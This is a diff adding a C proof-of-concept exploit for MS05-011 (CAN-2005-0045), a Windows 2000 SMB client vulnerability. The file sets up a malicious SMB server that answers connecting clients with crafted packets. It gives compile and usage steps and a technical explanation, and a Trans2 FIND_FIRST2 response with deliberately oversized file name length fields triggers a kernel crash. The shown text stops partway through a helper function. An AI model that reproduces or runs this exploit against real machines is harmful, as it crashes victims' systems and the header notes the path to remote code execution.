@@ -1,0 +1,950 @@
+/*
+ * Windows SMB Client Transaction Response Handling
+ *
+ * MS05-011
+ * CAN-2005-0045
+ *
+ * This works against >> Win2k <<
+ *
+ * cybertronic[at]gmx[dot]net
+ * http://www.livejournal.com/users/cybertronic/
+ *
+ * usage:
+ * gcc -o mssmb_poc mssmb_poc.c
+ * ./mssmb_poc
+ *
+ * connect via \\ip
+ * and hit the netbios folder!
+ *
+ * ***STOP: 0x00000050 (0xF115B000,0x00000001,0xFAF24690,
+ *                      0x00000000)
+ * PAGE_FAULT_IN_NONPAGED_AREA
+ *
+ * The Client reboots immediately
+ *
+ * Technical Details:
+ * -----------------
+ *
+ * The driver MRXSMB.SYS is responsible for performing SMB
+ * client operations and processing the responses returned
+ * by an SMB server service. A number of important Windows
+ * File Sharing operations, and all RPC-over-named-pipes,
+ * use the SMB commands Trans (25h) and Trans2 (32h). A
+ * malicious SMB server can respond with specially crafted
+ * Transaction response data that will cause an overflow
+ * wherever the data is handled, either in MRXSMB.SYS or
+ * in client code to which it provides data. One example
+ * would be if the
+ *
+ * file name length field
+ *
+ * and the
+ *
+ * short file name length field
+ *
+ * in a Trans2 FIND_FIRST2 response packet can be supplied
+ * with inappropriately large values in order to cause an
+ * excessive memcpy to occur when the data is handled.
+ * In the case of these examples an attacker could leverage
+ * file:// links, that when clicked by a remote user, would
+ * lead to code execution.
+ *
+ */
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define PORT	445
+
+unsigned char SmbNeg[] =
+"\x00\x00\x00\x55"
+"\xff\x53\x4d\x42"                 // SMB
+"\x72"                             // SMB Command: Negotiate Protocol (0x72)
+"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
+"\x98"                             // Flags: 0x98
+"\x53\xc8"                         // Flags2 : 0xc853
+"\x00\x00"                         // Process ID High: 0
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
+"\x00\x00"                         // Reserved: 0000
+"\x00\x00"                         // Tree ID: 0
+"\xff\xfe"                         // Process ID: 65279
+"\x00\x00"                         // User ID: 0
+"\x00\x00"                         // Multiplex ID: 0
+"\x11"                             // Word Count (WCT): 17
+"\x05\x00"                         // Dialect Index: 5, greater than LANMAN2.1
+"\x03"                             // Security Mode: 0x03
+"\x0a\x00"                         // Max Mpx Count: 10
+"\x01\x00"                         // Max VCs: 1
+"\x04\x11\x00\x00"                 // Max Buffer Size: 4356
+"\x00\x00\x01\x00"                 // Max Raw Buffer 65536
+"\x00\x00\x00\x00"                 // Session Key: 0x00000000
+"\xfd\xe3\x00\x80"                 // Capabilities: 0x8000e3fd
+"\x52\xa2\x4e\x73\xcb\x75\xc5\x01" // System Time: Jun 20, 2005 12:08:32.327125000
+"\x88\xff"                         // Server Time Zone: /120 min from UTC
+"\x00"                             // Key Length: 0
+"\x10\x00"                         // Byte Count (BCC): 16
+"\x9e\x12\xd7\x77\xd4\x59\x6c\x40" // Server GUID: 9E12D777D4596C40
+"\xbc\xc0\xb4\x22\x40\x50\x01\xd4";//              BCC0B422405001D4
+
+unsigned char SessionSetupAndXNeg[] = // Negotiate ERROR Response
+"\x00\x00\x01\x1b"
+"\xff\x53\x4d\x42\x73\x16\x00\x00\xc0\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x04\xff\x00\x1b\x01\x00\x00\xa6\x00\xf0\x00\x4e\x54\x4c\x4d\x53"
+"\x53\x50\x00\x02\x00\x00\x00\x12\x00\x12\x00\x30\x00\x00\x00\x15"
+"\x82\x8a\xe0"
+"\x00\x00\x00\x00\x00\x00\x00\x00" // NTLM Challenge
+"\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x64\x00\x42\x00\x00\x00"
+"\x53\x00\x45\x00\x52\x00\x56\x00\x49\x00\x43\x00\x45\x00\x50\x00"
+"\x43\x00\x02\x00\x12\x00\x53\x00\x45\x00\x52\x00\x56\x00\x49\x00"
+"\x43\x00\x45\x00\x50\x00\x43\x00\x01\x00\x12\x00\x53\x00\x45\x00"
+"\x52\x00\x56\x00\x49\x00\x43\x00\x45\x00\x50\x00\x43\x00\x04\x00"
+"\x12\x00\x73\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00"
+"\x70\x00\x63\x00\x03\x00\x12\x00\x73\x00\x65\x00\x72\x00\x76\x00"
+"\x69\x00\x63\x00\x65\x00\x70\x00\x63\x00\x06\x00\x04\x00\x01\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f"
+"\x00\x77\x00\x73\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x57"
+"\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32"
+"\x00\x30\x00\x30\x00\x30\x00\x20\x00\x4c\x00\x41\x00\x4e\x00\x20"
+"\x00\x4d\x00\x61\x00\x6e\x00\x61\x00\x67\x00\x65\x00\x72\x00\x00";
+
+unsigned char SessionSetupAndXAuth[] =
+"\x00\x00\x00\x75"
+"\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x04\xff\x00\x75\x00\x01\x00\x00\x00\x4a\x00\x4e\x57\x00\x69\x00"
+"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x35\x00\x2e\x00"
+"\x31\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00"
+"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x4c\x00"
+"\x41\x00\x4e\x00\x20\x00\x4d\x00\x61\x00\x6e\x00\x61\x00\x67\x00"
+"\x65\x00\x72\x00\x00";
+
+unsigned char TreeConnectAndX[] =
+"\x00\x00\x00\x38"
+"\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x07\xff\x00\x38\x00\x01\x00\xff\x01\x00\x00\xff\x01\x00\x00\x07"
+"\x00\x49\x50\x43\x00\x00\x00\x00";
+
+unsigned char SmbNtCreate [] =
+"\x00\x00\x00\x87"
+"\xff\x53\x4d\x42"                 // SMB
+"\xa2"                             // SMB Command: NT Create AndX (0xa2)
+"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
+"\x98"                             // Flags: 0x98
+"\x07\xc8"                         // Flags2 : 0xc807
+"\x00\x00"                         // Process ID High: 0
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
+"\x00\x00"                         // Reserved: 0000
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // User ID: 0
+"\x00\x00"                         // Multiplex ID: 0
+"\x2a"                             // Word Count (WCT): 42
+"\xff"                             // AndXCommand: No further commands (0xff)
+"\x00"                             // Reserved: 00
+"\x87\x00"                         // AndXOffset: 135
+"\x00"                             // Oplock level: No oplock granted (0)
+"\x00\x00"                         // FID: 0
+"\x01\x00\x00\x00"                 // Create action: The file existed and was opened (1)
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Created: No time specified (0)
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Last Access: No time specified (0)
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Last Write: No time specified (0)
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Change: No time specified (0)
+"\x80\x00\x00\x00"                 // File Attributes: 0x00000080
+"\x00\x10\x00\x00\x00\x00\x00\x00" // Allocation Size: 4096
+"\x00\x00\x00\x00\x00\x00\x00\x00" // End Of File: 0
+"\x02\x00"                         // File Type: Named pipe in message mode (2)
+"\xff\x05"                         // IPC State: 0x05ff
+"\x00"                             // Is Directory: This is NOT a directory (0)
+"\x00\x00"                         // Byte Count (BCC): 0
+
+// crap
+"\x00\x00\x00\x0f\x00\x00\x00\x00"
+"\x00\x74\x7a\x4f\xac\x2d\xdf\xd9"
+"\x11\xb9\x20\x00\x10\xdc\x9b\x01"
+"\x12\x00\x9b\x01\x12\x00\x1b\xc2";
+
+unsigned char DceRpc[] =
+"\x00\x00\x00\x7c"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x44\x00\x00\x00\x00\x00\x38\x00\x00\x00\x44\x00\x38"
+"\x00\x00\x00\x00\x00\x45\x00\x00\x05\x00\x0c\x03\x10\x00\x00\x00"
+"\x44\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10"
+"\x00\x00\x00\x00"                 // Assoc Group
+"\x0d\x00\x5c\x50\x49\x50\x45\x5c"
+"\x00\x00\x00"                     // srv or wks
+"\x73\x76\x63\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x04\x5d\x88"
+"\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00"
+"\x00";
+
+unsigned char WksSvc[] =
+"\x00\x00\x00\xb0"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x78\x00\x00\x00\x00\x00\x38\x00\x00\x00\x78\x00\x38"
+"\x00\x00\x00\x00\x00\x79\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x78\x00\x00\x00\x01\x00\x00\x00\x60\x00\x00\x00\x00\x00\x00\x00"
+"\x64\x00\x00\x00\xb8\x0f\x16\x00\xf4\x01\x00\x00\xe6\x0f\x16\x00"
+"\xd2\x0f\x16\x00\x05\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x00\x00"
+"\x00\x00\x00\x00\x0a\x00\x00\x00\x53\x00\x45\x00\x52\x00\x56\x00"
+"\x49\x00\x43\x00\x45\x00\x50\x00\x43\x00\x00\x00\x0a\x00\x00\x00"
+"\x00\x00\x00\x00\x0a\x00\x00\x00\x57\x00\x4f\x00\x52\x00\x4b\x00"
+"\x47\x00\x52\x00\x4f\x00\x55\x00\x50\x00\x00\x00\x00\x00\x00\x00";
+
+unsigned char SrvSvc[] =
+"\x00\x00\x00\xac"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x74\x00\x00\x00\x00\x00\x38\x00\x00\x00\x74\x00\x38"
+"\x00\x00\x00\x00\x00\x75\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x74\x00\x00\x00\x01\x00\x00\x00\x5c\x00\x00\x00\x00\x00\x00\x00"
+"\x65\x00\x00\x00\x68\x3d\x14\x00\xf4\x01\x00\x00"
+"\x80\x3d\x14\x00"                                                 // Server IP
+"\x05\x00\x00\x00\x01\x00\x00\x00\x03\x10\x05\x00\x9c\x3d\x14\x00"
+"\x0e\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00"
+"\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00" // Server IP ( UNICODE )
+"\x32\x00\x2e\x00\x31\x00\x30\x00\x33\x00\x00\x00"
+"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x55\x00"
+"\x00\x00\x00\x00";
+
+unsigned char SmbClose[] =
+"\x00\x00\x00\x23"
+"\xff\x53\x4d\x42"                 // SMB
+"\x04"                             // SMB Command: Close (0x04)
+"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
+"\x98"                             // Flags: 0x98
+"\x07\xc8"                         // Flags2 : 0xc807
+"\x00\x00"                         // Process ID High: 0
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
+"\x00\x00"                         // Reserved: 0000
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x00"                             // Word Count (WCT): 0
+"\x00\x00";                        // Byte Count (BCC): 0
+
+unsigned char NetrShareEnum[] =
+"\x00\x00\x01\x90"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x58\x01\x00\x00\x00\x00\x38\x00\x00\x00\x58\x01\x38"
+"\x00\x00\x00\x00\x00\x59\x01\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x58\x01\x00\x00\x01\x00\x00\x00\x40\x01\x00\x00\x00\x00\x00\x00"
+"\x01\x00\x00\x00\x01\x00\x00\x00\x54\x0a\x17\x00\x04\x00\x00\x00"
+"\xa0\x28\x16\x00\x04\x00\x00\x00\x80\x48\x16\x00\x03\x00\x00\x80"
+"\x8a\x48\x16\x00\x6e\x48\x16\x00\x00\x00\x00\x00\x7e\x48\x16\x00"
+"\x48\x48\x16\x00\x00\x00\x00\x80\x56\x48\x16\x00\x20\x48\x16\x00"
+"\x00\x00\x00\x80\x26\x48\x16\x00\x05\x00\x00\x00\x00\x00\x00\x00"
+"\x05\x00\x00\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x36\x00"
+"\x0b\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x52\x00\x65\x00"
+"\x6d\x00\x6f\x00\x74\x00\x65\x00\x2d\x00\x49\x00\x50\x00\x43\x00"
+"\x00\x00\x37\x00\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00"
+"\x6e\x00\x65\x00\x74\x00\x62\x00\x69\x00\x6f\x00\x73\x00\x00\x00"
+"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
+"\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x41\x00\x44\x00"
+"\x4d\x00\x49\x00\x4e\x00\x24\x00\x00\x00\x00\x00\x0c\x00\x00\x00"
+"\x00\x00\x00\x00\x0c\x00\x00\x00\x52\x00\x65\x00\x6d\x00\x6f\x00"
+"\x74\x00\x65\x00\x61\x00\x64\x00\x6d\x00\x69\x00\x6e\x00\x00\x00"
+"\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x43\x00\x24\x00"
+"\x00\x00\x39\x00\x11\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00"
+"\x53\x00\x74\x00\x61\x00\x6e\x00\x64\x00\x61\x00\x72\x00\x64\x00"
+"\x66\x00\x72\x00\x65\x00\x69\x00\x67\x00\x61\x00\x62\x00\x65\x00"
+"\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
+unsigned char OpenPrinterEx[] =
+"\x00\x00\x00\x68"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
+"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x30\x00\x00\x00\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x24\xd7\x9c\xf8\xbb\xe1\xd9\x11\xb9\x29\x00\x10"
+"\xdc\x4a\x6b\xbb\x00\x00\x00\x00";
+
+unsigned char ClosePrinter[] =
+"\x00\x00\x00\x68"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
+"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x30\x00\x00\x00\x02\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00";
+
+unsigned char OpenHklm[] =
+"\x00\x00\x00\x68"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
+"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x30\x00\x00\x00\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x4e\x4c\xb2\xf8\xbb\xe1\xd9\x11\xb9\x29\x00\x10"
+"\xdc\x4a\x6b\xbb\x00\x00\x00\x00";
+
+unsigned char OpenKey[] =
+"\x00\x00\x00\x68"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
+"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x30\x00\x00\x00\x02\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x05\x00\x00\x00";
+
+unsigned char CloseKey[] =
+"\x00\x00\x00\x68"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
+"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x30\x00\x00\x00\x03\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00";
+
+unsigned char NetBios1[] =
+"\x00\x00\x00\x94"
+"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a\x00\x00\x5c\x00\x00\x00\x00\x00\x38\x00\x00\x00\x5c\x00\x38"
+"\x00\x00\x00\x00\x00\x5d\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
+"\x5c\x00\x00\x00\x01\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00"
+"\x01\x00\x00\x00\xc0\xa2\x16\x00\xae\xc2\x16\x00\x00\x00\x00\x00"
+"\xbe\xc2\x16\x00\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00"
+"\x6e\x00\x65\x00\x74\x00\x62\x00\x69\x00\x6f\x00\x73\x00\x00\x00"
+"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x2e\x00"
+"\x00\x00\x00\x00";
+
+unsigned char NetBios2[] =
+"\x00\x00\x00\x3e"
+"\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x07\xff\x00\x3e\x00\x01\x00\xff\x01\x00\x00\xff\x01\x00\x00\x0d"
+"\x00\x41\x3a\x00\x4e\x00\x54\x00\x46\x00\x53\x00\x00\x00";
+
+// Trans2 Response, QUERY_PATH_INFO
+unsigned char Trans2Response1[] =
+"\x00\x00\x00\x64"
+"\xff\x53\x4d\x42"                 // SMB
+"\x32"                             // SMB Command: Trans2 (0x32)
+"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
+"\x98"                             // Flags: 0x98
+"\x07\xc8"                         // Flags2 : 0xc807
+"\x00\x00"                         // Process ID High: 0
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
+"\x00\x00"                         // Reserved: 0000
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a"                             // Word Count (WCT): 10
+"\x02\x00"                         // Total Parameter Count: 2
+"\x28\x00"                         // Total Data Count: 40
+"\x00\x00"                         // Reserved: 0000
+"\x02\x00"                         // Parameter Count: 2
+"\x38\x00"                         // Parameter Offset: 56
+"\x00\x00"                         // Parameter Displacement: 0
+"\x28\x00"                         // Data Count: 40
+"\x3c\x00"                         // Data Offset: 60
+"\x00\x00"                         // Data Displacement: 0
+"\x00"                             // Setup Count: 0
+"\x00"                             // Reserved: 00
+"\x2d\x00"                         // Byte Count (BCC): 45
+"\x00"                             // Padding: 00
+"\x00\x00"                         // EA Error offset: 0
+"\x00\x01"                         // Padding: 0001
+"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Created: Jun 17, 2005 05:39:19.686500000
+"\x8c\x24\xba\x5c\x3a\x73\xc5\x01" // Last Access: Jun 17, 2005 05:44:55.092750000
+"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Last Write: Jun 17, 2005 05:39:19.686500000
+"\x9c\x81\x67\x98\x39\x73\xc5\x01" // Change:  Jun 17, 2005 05:39:25.717750000
+"\x10\x00\x00\x00"                 // File Attributes: 0x00000010
+"\x00\x00\x00\x00";                // Unknown Data: 00000000
+
+// Trans2 Response, QUERY_PATH_INFO
+unsigned char Trans2Response2[] = // ERROR Response
+"\x00\x00\x00\x23"
+"\xff\x53\x4d\x42\x32\x34\x00\x00\xc0\x98\x07\xc8\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x00\x00\x00";
+
+// Trans2 Response, FIND_FIRST2, Files: . ..
+unsigned char Trans2Response3[] =
+"\x00\x00\x01\x0c"
+"\xff\x53\x4d\x42"                 // SMB
+"\x32"                             // SMB Command: Trans2 (0x32)
+"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
+"\x98"                             // Flags: 0x98
+"\x07\xc8"                         // Flags2 : 0xc807
+"\x00\x00"                         // Process ID High: 0
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
+"\x00\x00"                         // Reserved: 0000
+"\x00\x00"                         // Tree ID: 0
+"\x00\x00"                         // Process ID: 0
+"\x00\x00"                         // USER ID
+"\x00\x00"                         // Multiplex ID: 0
+"\x0a"                             // Word Count (WCT): 10
+"\x0a\x00"                         // Total Parameter Count: 10
+"\xc8\x00"                         // Total Data Count: 200
+"\x00\x00"                         // Reserved: 0000
+"\x0a\x00"                         // Parameter Count: 10
+"\x38\x00"                         // Parameter Offset: 56
+"\x00\x00"                         // Parameter Displacement: 0
+"\xc8\x00"                         // Data Count: 200
+"\x44\x00"                         // Data Offset: 68
+"\x00\x00"                         // Data Displacement: 0
+"\x00"                             // Setup Count: 0
+"\x00"                             // Reserved: 00
+"\xd5\x00"                         // Byte Count (BCC): 213
+"\x00"                             // Padding: 00
+"\x01\x08"                         // Search ID: 0x0801
+"\x02\x00"                         // Seatch Count: 2
+"\x01\x00"                         // End of Search: 1
+"\x00\x00"                         // EA Error offset: 0
+"\x60\x00"                         // Last Name offset: 96
+"\x38\x00"                         // Padding: 3800
+"\x60\x00\x00\x00"                 // Next Entry offset: 96
+"\x00\x00\x00\x00"                 // File Index: 0
+"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Created: Jun 17, 2005 05:39:19.686500000
+"\xac\x09\x3c\xae\x39\x73\xc5\x01" // Last Access: Jun 17, 2005 05:40:02.342750000
+"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Last Write: Jun 17, 2005 05:39:19.686500000
+"\x9c\x81\x67\x98\x39\x73\xc5\x01" // Change:  Jun 17, 2005 05:39:25.717750000
+"\x00\x00\x00\x00\x00\x00\x00\x00" // End of File: 0
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Allocation Size: 0
+"\x10\x00\x00\x00"                 // File Attributes: 0x00000010
+//"\x02\x00\x00\x00"               // File Name Len: 2
+"\xff\xff\xff\xff"                 // Bad File Name Len
+"\x00\x00\x00\x00"                 // EA List Length: 0
+//"\x00"                           // Short File Name Len: 0
+"\xff"                             // Bad Short File Name Len
+"\x00"                             // Reserved: 00
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
+"\x2e\x00"                         // File Name: .
+"\x00\x00\x00\x00"                 // Next Entry Offset: 0
+"\x00\x00\x00\x00"                 // File Index: 0
+"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Created: Jun 17, 2005 05:39:19.686500000
+"\xac\x09\x3c\xae\x39\x73\xc5\x01" // Last Access: Jun 17, 2005 05:40:02.342750000
+"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Last Write: Jun 17, 2005 05:39:19.686500000
+"\x9c\x81\x67\x98\x39\x73\xc5\x01" // Change:  Jun 17, 2005 05:39:25.717750000
+"\x00\x00\x00\x00\x00\x00\x00\x00" // End Of File: 0
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Allocation Size: 0
+"\x10\x00\x00\x00"                 // File Attributes: 0x00000010
+"\x04\x00\x00\x00"                 // File Name Len: 4
+"\x00\x00\x00\x00"                 // EA List Length: 0
+"\x00"                             // Short File Name Len: 0
+"\x00"                             // Reserved: 00
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
+"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
+"\x2e\x00\x2e\x00"                 // File Name: ..
+"\x00\x00\x00\x00\x00\x00";        // Unknown Data: 000000000000
+
+int
+check_interface ( char* str )
+{
+	int i, j, wks = 0, srv = 0, spl = 0, wrg = 0, foo = 0;
+
+	//Interface UUID
+	unsigned char wks_uuid[] = "\x98\xd0\xff\x6b\x12\xa1\x10\x36\x98\x33\x46\xc3\xf8\x7e\x34\x5a";
+	unsigned char srv_uuid[] = "\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88";
+	unsigned char spl_uuid[] = "\x78\x56\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\x89\xab";
+	unsigned char wrg_uuid[] = "\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03";
+
+	for ( i = 0; i < 16; i++ )
+	{
+		j = 0;
+		if ( str[120 + i] < 0 )
+		{
+			if ( ( str[120 + i] + 0x100 ) == wks_uuid[i] )
+				{ wks++; j = 1; }
+			if ( ( str[120 + i] + 0x100 ) == srv_uuid[i] )
